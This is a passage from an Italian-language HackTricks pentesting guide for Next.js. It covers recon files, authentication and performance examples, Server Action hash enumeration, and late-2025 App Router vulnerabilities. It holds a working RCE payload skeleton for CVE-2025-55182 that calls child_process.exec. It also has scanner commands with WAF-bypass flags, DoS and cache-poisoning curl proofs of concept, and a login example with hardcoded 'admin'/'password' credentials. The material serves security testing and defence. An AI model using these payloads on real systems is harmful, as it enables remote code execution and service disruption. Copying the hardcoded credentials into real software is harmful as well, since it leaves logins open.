- `.next/routes-manifest.json` and `.next/build-manifest.json` per l'elenco completo delle route.
- `.next/server/pages/api/auth/[...nextauth].js` per recuperare la configurazione compilata di NextAuth (spesso contiene password di fallback quando i valori in `process.env` non sono impostati).
- `next.config.js` / `next.config.mjs` per esaminare riscritture, reindirizzamenti e l'instradamento del middleware.

### Authentication and Authorization

**Approccio:**

- **Session-Based Authentication:** Usa cookie per gestire le sessioni utente.
- **Token-Based Authentication:** Implementa JWT per l'autenticazione senza stato.
- **Third-Party Providers:** Integra provider OAuth (es. Google, GitHub) usando librerie come `next-auth`.

**Pratiche di Sicurezza:**

- **Secure Cookies:** Imposta gli attributi `HttpOnly`, `Secure` e `SameSite`.
- **Password Hashing:** Esegui sempre l'hashing delle password prima di salvarle.
- **Input Validation:** Previeni attacchi di injection validando e sanificando gli input.

**Example:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Ottimizzazione delle prestazioni

**Strategie:**

- **Ottimizzazione delle immagini:** Usa il componente `next/image` di Next.js per l'ottimizzazione automatica delle immagini.
- **Code Splitting:** Sfrutta gli import dinamici per suddividere il codice e ridurre i tempi di caricamento iniziale.
- **Caching:** Implementa strategie di caching per le risposte API e le risorse statiche.
- **Lazy Loading:** Carica componenti o risorse solo quando sono necessari.

**Esempio:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash a nome della funzione via source maps)

Le moderne applicazioni Next.js utilizzano “Server Actions” che vengono eseguite sul server ma sono invocate dal client. In produzione queste invocazioni sono opache: tutte le richieste POST arrivano su un endpoint comune e sono distinte da un hash specifico della build inviato nell'intestazione `Next-Action`. Esempio:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Quando `productionBrowserSourceMaps` è abilitato, i chunk JS minificati contengono chiamate a `createServerReference(...)` che leak abbastanza struttura (più i source maps associati) per ricostruire una mappatura tra l'hash dell'azione e il nome della funzione originale. Questo ti permette di tradurre gli hash osservati in `Next-Action` in obiettivi concreti come `deleteUserAccount()` o `exportFinancialData()`.

### Approccio di estrazione (regex su minified JS + optional source maps)

Cerca nei chunk JS scaricati `createServerReference` ed estrai l'hash e il simbolo della funzione/sorgente. Due pattern utili:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Gruppo 1: hash dell'azione server (40+ caratteri esadecimali)
- Gruppo 2: simbolo o percorso che può essere risolto nel nome della funzione originale tramite la source map quando presente

Se lo script dichiara una source map (trailer comment `//# sourceMappingURL=<...>.map`), recuperala e risolvi il simbolo/percorso nel nome della funzione originale.

### Flusso pratico

- Scoperta passiva durante la navigazione: cattura richieste con intestazioni `Next-Action` e URL dei chunk JS.
- Recupera i bundle JS referenziati e i relativi file `*.map` (quando presenti).
- Esegui la regex sopra per costruire un dizionario hash↔nome.
- Usa il dizionario per indirizzare i test:
- Triage basato sui nomi (es. `transferFunds`, `exportFinancialData`).
- Traccia la copertura tra le build tramite il nome della funzione (gli hash ruotano tra le build).

### Esecuzione di azioni nascoste (richiesta basata su template)

Prendi una POST valida osservata in-proxy come template e sostituisci il valore `Next-Action` per mirare un'altra action scoperta:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Ripeti in Repeater e testa autorizzazione, validazione degli input e logica di business di azioni altrimenti non raggiungibili.

### Burp automation

- NextjsServerActionAnalyzer (estensione Burp) automatizza quanto sopra in Burp:
- Scava la cronologia del proxy per JS chunks, estrae le voci `createServerReference(...)` e analizza gli source maps quando disponibili.
- Mantiene un dizionario hash↔function-name ricercabile e de-duplica tra build in base al nome della funzione.
- Può individuare un POST template valido e aprire una scheda Repeater pronta per l'invio con l'hash dell'azione target sostituito.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Richiede `productionBrowserSourceMaps` abilitato in production per recuperare i nomi dai bundles/source maps.
- La divulgazione dei function-name non è di per sé una vulnerabilità; usala per guidare la scoperta e testare l'autorizzazione di ogni action.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Le distribuzioni Next.js App Router che espongono Server Actions su `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** contengono una grave prototype pollution lato server durante la deserializzazione dei chunk **Flight**. Manipolando riferimenti `$` all'interno di un payload Flight, un attaccante può passare da prototype inquinati all'esecuzione arbitraria di JavaScript e poi all'esecuzione di comandi OS nel processo Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Catena d'attacco nei chunk Flight

1. **Primitive di prototype pollution:** Imposta `"then": "$1:__proto__:then"` in modo che il resolver scriva una funzione `then` su `Object.prototype`. Qualsiasi oggetto plain processato successivamente diventa thenable, permettendo all'attaccante di influenzare il controllo del flusso async all'interno degli internals di RSC.
2. **Ricollegamento al costruttore globale `Function`:** Punta `_response._formData.get` su `"$1:constructor:constructor"`. Durante la risoluzione, `object.constructor` → `Object`, e `Object.constructor` → `Function`, quindi le future chiamate a `_formData.get()` eseguiranno effettivamente `Function(...)`.
3. **Esecuzione di codice tramite `_prefix`:** Inserisci sorgente JavaScript in `_response._prefix`. Quando viene invocato il `_formData.get` inquinato, il framework valuta `Function(_prefix)(...)`, quindi il JS iniettato può eseguire `require('child_process').exec()` o qualsiasi altro primitivo Node.

#### Scheletro del payload
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Mappare l'esposizione delle React Server Function

React Server Functions (RSF) sono tutte le funzioni che includono la direttiva 'use server';. Ogni form action, mutation, o fetch helper legato a una di queste funzioni diventa un RSC Flight endpoint che deserializzerà volentieri payload forniti dall'attaccante. Passi di recon utili ricavati dalle valutazioni di React2Shell:

- **Static inventory:** cerca la direttiva per capire quante RSFs vengono automaticamente esposte dal framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` abilita l'App Router + la directory `app/` di default, il che trasforma silenziosamente ogni route in un endpoint compatibile RSC. Asset dell'App Router come `/_next/static/chunks/app/` o risposte che streamano Flight chunks su `text/x-component` sono forti fingerprints esposti su Internet.
- **Implicitly vulnerable RSC deployments:** l'avviso ufficiale di React indica che le app che distribuiscono il runtime RSC possono essere sfruttabili **anche senza RSFs espliciti**, quindi considera sospette tutte le build che usano `react-server-dom-*` 19.0.0–19.2.0.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, ecc. riutilizzano lo stesso serializer e ereditano la medesima superficie di attacco remota finché non incorporano build di React patchate.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 e 19.2.0; **patched** in 19.0.1, 19.1.2 e 19.2.1 rispettivamente.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 incorporano lo stack RSC vulnerabile. I train di patch 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 includono dipendenze corrette, quindi qualsiasi build inferiore a quelle versioni è di alto valore.
- **Next.js canary:** `14.3.0-canary.77+` include anch'essa il runtime buggy e al momento manca di canary drops patchati, rendendo quei fingerprints forti candidati per l'exploitation.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) invia una Flight request multipart costruita a percorsi candidati e osserva il comportamento server-side:

- **Default mode** esegue un payload RCE deterministico (operazione matematica riflessa tramite `X-Action-Redirect`) che dimostra l'esecuzione di codice.
- **`--safe-check` mode** corrompe volutamente il messaggio Flight in modo che i server patchati rispondano con `200/400`, mentre i target vulnerabili emettono risposte `HTTP/500` contenenti la sottostringa `E{"digest"` nel body. Questa coppia `(500 + digest)` è attualmente l'oracolo remoto più affidabile pubblicato dai defender.
- Gli switch integrati `--waf-bypass`, `--vercel-waf-bypass`, e `--windows` aggiustano il layout del payload, antepongono junk o sostituiscono comandi OS così da poter sondare asset reali su Internet.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Altri problemi recenti di App Router (tarda 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – payload Flight malformati possono mandare il resolver RSC in un loop infinito (DoS pre-auth) o forzare la serializzazione del codice compilato di Server Function per altre azioni. Le build di App Router ≥13.3 sono vulnerabili fino alla patch; le versioni 15.0.x–16.0.x richiedono le linee di patch specifiche dall'advisory upstream. Riutilizza il normale percorso Server Action ma streamma un body `text/x-component` con riferimenti `$` abusivi. Dietro un CDN la connessione bloccata viene mantenuta aperta dai timeout della cache, rendendo il DoS economico.
- **Suggerimento di triage:** Target non patchati ritornano `500` con `E{"digest"` dopo payload Flight malformati; build patchate ritornano `400/200`. Testa qualsiasi endpoint che già streamma chunk Flight (cerca header `Next-Action` o risposte `text/x-component`) e riproduci con un payload modificato.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – la mancanza di `Vary` permette a una risposta con `Accept: text/x-component` di essere memorizzata in cache e servita a browser che si aspettano HTML. Una singola richiesta di priming può sostituire la pagina con payload RSC grezzi. Flusso PoC:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
Se la seconda risposta restituisce dati JSON Flight invece di HTML, la route è soggetta a cache poisoning. Pulisci la cache dopo i test.

## Riferimenti

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
